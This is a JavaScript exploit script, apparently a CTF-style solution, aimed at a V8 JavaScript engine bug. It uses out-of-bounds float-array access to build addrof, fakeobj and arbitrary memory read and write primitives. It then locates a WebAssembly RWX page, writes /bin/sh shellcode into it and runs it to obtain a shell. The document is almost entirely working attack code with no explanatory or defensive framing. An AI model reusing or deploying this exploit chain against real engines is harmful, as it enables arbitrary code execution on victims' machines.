var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

// overwrite float elements ptr with obj ptr

let float_arr = [1.1, 1.1, 1.1].slice(0);
let float_arr_map = ftoi(float_arr[3]) & 0xffffffffn;
let float_arr_elements = ftoi(float_arr[4]) & 0xffffffffn;
let temp = {A: 1};
let obj_arr = [temp].slice(0);
let obj_arr_map = float_arr_map + 80n;
let obj_arr_elements = float_arr_elements + 320n;
const debug = false;

function addrof(obj){
	obj_arr[0] = obj;
	let f_arr = [1.1, 1.1, 1.1].slice(0);
	f_arr[4] = itof((5n << 32n) + obj_arr_elements);

	return ftoi(f_arr[0]) & 0xffffffffn;
}

function fakeobj(addr){
	let f_arr = [itof(addr), 1.1, 1.1].slice(0);
	f_arr[3] = itof((5n << 32n) + obj_arr_map);
	
	return f_arr[0];
}

function arb_heap_read(addr){
	let arr = [itof((float_arr_map << 32n) + float_arr_map),
				 1.1, 
				 1.1, 
				 itof(0x10n)];
	
	// 0x10 for elements, 0x10 for 0'th index
	let fake = fakeobj(addrof(arr) - 0x20n);

	arr[1] = itof(((0x10n) << 32n) + addr - 0x8n + 1n);
	
	return ftoi(fake[0]) & 0xffffffffn;
}

function arb_heap_write(addr, value){
	let arr = [itof((float_arr_map << 32n) + float_arr_map),
				 1.1, 
				 1.1, 
				 itof(0x10n)];
	
	// 0x10 for elements, 0x10 for 0'th index
	let fake = fakeobj(addrof(arr) - 0x20n);

	arr[1] = itof(((0x10n) << 32n) + addr - 0x8n + 1n);

	fake[0] = itof(BigInt(value));
}

function arb_write(addr, value){
	let temp_buf = new ArrayBuffer(0x10);
	let view = new DataView(temp_buf);
	let backing_store = addrof(temp_buf) - 1n + 0x14n;

	arb_heap_write(backing_store, BigInt(addr) & 0xffffffffn);
	arb_heap_write(backing_store + 4n, BigInt(addr) >> 32n);
	
	if (debug){
		console.log("[DEBUG]: writing 0x" + value.toString(16) + " to address: 0x" + addr.toString(16));
	}

	view.setBigUint64(0, value, true);
}

function copy_shellcode(addr, shellcode) {
	let temp_buf = new ArrayBuffer(0x100);
	let view = new DataView(temp_buf);
	let backing_store = addrof(temp_buf) - 1n + 0x14n;

	arb_heap_write(backing_store, BigInt(rwx_base_addr) & 0xffffffffn);
	arb_heap_write(backing_store + 4n, BigInt(rwx_base_addr) >> 32n);

	for (let i = 0; i < shellcode.length; i++) {
		view.setInt32(i * 4, shellcode[i]);
		if (debug){
			console.log("[DEBUG]: writing 0x" + shellcode[i].toString(16) + " to 0x" + (Number(addr) + i * 4).toString(16));
		}
	}

}

const wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
const wasm_mod = new WebAssembly.Module(wasm_code);
const wasm_instance = new WebAssembly.Instance(wasm_mod);
const pop_calc = wasm_instance.exports.main;

// offset by gdb, search-pattern.
let first = arb_heap_read(addrof(wasm_instance) + 0x67n);
let second = arb_heap_read(addrof(wasm_instance) + 4n + 0x67n);
let rwx_base_addr = (second << 32n) + first; 

console.log("[INFO]: rwx base addr: 0x" + rwx_base_addr.toString(16));

const binsh_shellcode = [0x504831d2, 0x4831f648, 0xbb2f6269, 0x6e2f2f73,
			   			 0x6853545f, 0xb03b0f05];
copy_shellcode(rwx_base_addr, binsh_shellcode);

console.log("[!] finished copying shellcode");
console.log("[!] enjoy shell");

pop_calc();